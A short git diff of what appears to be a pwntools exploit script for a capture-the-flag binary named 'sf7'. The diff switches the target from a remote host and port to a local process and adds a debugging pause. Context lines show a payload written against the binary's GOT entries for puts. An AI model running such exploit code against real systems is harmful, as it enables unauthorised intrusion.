@@ -1,7 +1,7 @@
 from pwn import *
 
-# p = process('./sf7')
-p = remote("129.154.197.81", 1800)
+p = process('./sf7')
+#p = remote("129.154.197.81", 1800)
 e = ELF('./sf7')
 # 129.154.197.81:1800
 
@@ -58,6 +58,8 @@ pay += p64(0) + p64(e.got['puts'])
 pay += p64(e.got['puts'])
 
 modify('BBBBBBBB\x00', pay)
+
+input()
 
 show()
 p.recvuntil("[5]\n")
